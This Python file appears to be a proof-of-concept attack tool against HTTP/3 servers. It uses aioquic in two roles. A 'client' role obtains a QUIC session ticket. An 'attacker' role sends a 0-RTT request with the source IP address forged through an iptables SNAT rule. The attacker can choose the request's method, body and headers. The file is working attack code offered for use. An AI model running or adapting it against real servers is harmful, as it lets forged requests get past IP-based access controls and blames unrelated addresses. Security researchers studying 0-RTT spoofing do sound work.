import asyncio
import contextlib
import dataclasses
import logging
from pathlib import Path
from urllib.parse import urlparse, ParseResult as URL
import ssl
import subprocess
import pickle
from typing import Optional, cast, AsyncGenerator

from aioquic.asyncio.protocol import QuicConnectionProtocol
from aioquic.asyncio.client import connect
from aioquic.h3.connection import H3_ALPN, H3Connection
from aioquic.h3.events import H3Event
from aioquic.quic.configuration import QuicConfiguration
from aioquic.quic.events import QuicEvent
from aioquic.quic.connection import QuicConnectionState
from aioquic.tls import SessionTicket
import click

logging.basicConfig(level=logging.INFO)
log = logging.getLogger("client")

SESSION_FILE = Path("session_ticket.pickle")
SECRETS_LOG_FILE = Path(__file__).parent / 'quic_secrets.log'


@dataclasses.dataclass
class HttpRequest:
    url: URL
    method: str = 'GET'
    headers: dict = dataclasses.field(default_factory=dict)
    data: bytes = b''


class HttpClient(QuicConnectionProtocol):
    def __init__(self, *args, **kwargs):
        super().__init__(*args, **kwargs)
        self.http: Optional[H3Connection] = H3Connection(self._quic)

    def quic_event_received(self, event: QuicEvent) -> None:
        if self.http is not None:
            for http_event in self.http.handle_event(event):
                self.http_event_received(http_event)

    def http_event_received(self, event: H3Event):
        log.info("Received HTTP event: %s", event)


@contextlib.asynccontextmanager
async def iptables_ip_spoofing(victim_ip='127.0.0.1', victim_port='4433', spoofed_source_ip='1.2.3.4') -> AsyncGenerator:
    iptables_command = [
        'iptables', '--append', 'POSTROUTING', '--table', 'nat',
        '--protocol', 'udp', '--destination', victim_ip, '--dport', str(victim_port),
        '--jump', 'SNAT', '--to-source', spoofed_source_ip
    ]
    try:
        log.info('Setting up iptables rule for source IP spoofing')
        subprocess.run(iptables_command, check=True)
        yield
    finally:
        log.info('Cleaning up iptables rule for source IP spoofing')
        iptables_command[1] = '--delete'
        subprocess.run(iptables_command, check=True)


@contextlib.asynccontextmanager
async def connect_h3(url: URL, session_ticket=None, **kwargs) -> AsyncGenerator[HttpClient, None]:
    configuration = QuicConfiguration(
        is_client=True,
        alpn_protocols=H3_ALPN,
        verify_mode=ssl.CERT_NONE,
        server_name=url.hostname,
        secrets_log_file=SECRETS_LOG_FILE.open('a'),
        session_ticket=session_ticket,
    )
    async with connect(
        host=url.hostname,
        port=url.port or 443,
        configuration=configuration,
        create_protocol=HttpClient,
        **kwargs,
    ) as client:
        yield client


async def get_session_ticket(url: URL) -> Optional[SessionTicket]:
    log.info('Initially connecting to server to get a session ticket')
    session_tickets = []

    async with connect_h3(
        url=url,
        session_ticket_handler=lambda t: session_tickets.append(t),
        wait_connected=True
    ):
        await asyncio.sleep(1)

    log.info('Initial connection done')
    return session_tickets[-1] if session_tickets else None


async def save_session_ticket(ticket: SessionTicket):
    with open(SESSION_FILE, "wb") as f:
        pickle.dump(ticket, f)
    log.info(f"Session ticket saved to {SESSION_FILE}")


async def load_session_ticket() -> SessionTicket:
    with open(SESSION_FILE, "rb") as f:
        return pickle.load(f)


async def http_ip_spoofing(request: HttpRequest, spoofed_ip: str, session_ticket: SessionTicket):
    log.info('Building 0-RTT QUIC packet')
    async with connect_h3(
        url=request.url,
        session_ticket=session_ticket,
        wait_connected=False  # Do NOT wait for confirmation
    ) as client:
        client = cast(HttpClient, client)

        stream_id = client._quic.get_next_available_stream_id()
        client.http.send_headers(
            stream_id=stream_id,
            headers=[
                (b":method", request.method.encode()),
                (b":scheme", request.url.scheme.encode()),
                (b":authority", request.url.netloc.encode()),
                (b":path", ((request.url.path or '/') + (f'?{request.url.query}' if request.url.query else '')).encode()),
            ] + [(k.lower().encode(), v.encode()) for k, v in request.headers.items()],
            end_stream=not request.data,
        )

        if request.data:
            client.http.send_data(
                stream_id=stream_id,
                data=request.data,
                end_stream=True
            )

        # Get 0-RTT datagram
        loop = asyncio.get_event_loop()
        datagrams = client._quic.datagrams_to_send(now=loop.time())
        if not datagrams:
            raise RuntimeError("No datagram generated for 0-RTT")

        data, addr = datagrams[0]
        victim_ip = addr[0].removeprefix('::ffff:') if addr[0].startswith('::ffff:') else addr[0]

        async with iptables_ip_spoofing(victim_ip=victim_ip, victim_port=addr[1], spoofed_source_ip=spoofed_ip):
            log.info('Sending spoofed 0-RTT packet...')
            client._transport.sendto(data, addr)  # 🔥 Send raw 0-RTT packet manually

        # Optionally receive server response (non-0RTT) for logging
        await asyncio.sleep(2)
        now = loop.time()
        events = client._quic.receive_datagram(data, addr, now=now)
        if events:
            for event in events:
                log.info(f"Received QUIC event: {event}")
        else:
            log.warning("No QUIC response received post spoofed request")

        # Clean termination
        client._quic._state = QuicConnectionState.TERMINATED
        client._closed.set()


async def run_client(url: URL):
    session_ticket = await get_session_ticket(url)
    if session_ticket is None:
        raise RuntimeError("No session ticket received. Server may not support 0-RTT.")
    await save_session_ticket(session_ticket)


async def run_attacker(url: URL, spoofed_ip: str, method='GET', data=None, header=None):
    session_ticket = await load_session_ticket()
    if not session_ticket or not session_ticket.max_early_data_size:
        raise RuntimeError("Invalid or missing session ticket for attacker.")

    data_bytes = data.encode() if data else None
    headers = dict(h.split(': ', 1) for h in header or [])
    spoofed_request = HttpRequest(
        url=url,
        method=method,
        data=data_bytes,
        headers=(
            {'Content-Length': str(len(data_bytes))} if data_bytes else {}) |
            ({'Content-Type': 'application/x-www-form-urlencoded'} if data_bytes and 'Content-Type' not in headers else {}) |
            headers,
    )
    await http_ip_spoofing(request=spoofed_request, spoofed_ip=spoofed_ip, session_ticket=session_ticket)


def parse_url(url_str: str) -> URL:
    return urlparse(url_str)


@click.command()
@click.argument('url', type=str)
@click.option('--role', type=click.Choice(['client', 'attacker']), required=True, help="Role to execute: client or attacker.")
@click.option('--spoofed-ip', type=str, default='1.2.3.4', help="IP to spoof from (attacker mode only)")
@click.option('-X', '--method', type=str, default='GET', help="HTTP method for spoofed request")
@click.option('-d', '--data', type=str, default=None, help="Request body for spoofed request")
@click.option('-H', '--header', type=str, multiple=True, help="Headers for spoofed request (e.g., -H 'User-Agent: curl')")
def cli_main(url, role, spoofed_ip, method, data, header):
    parsed_url = parse_url(url)
    if role == 'client':
        asyncio.run(run_client(parsed_url))
    elif role == 'attacker':
        asyncio.run(run_attacker(parsed_url, spoofed_ip, method, data, header))


if __name__ == "__main__":
    cli_main()
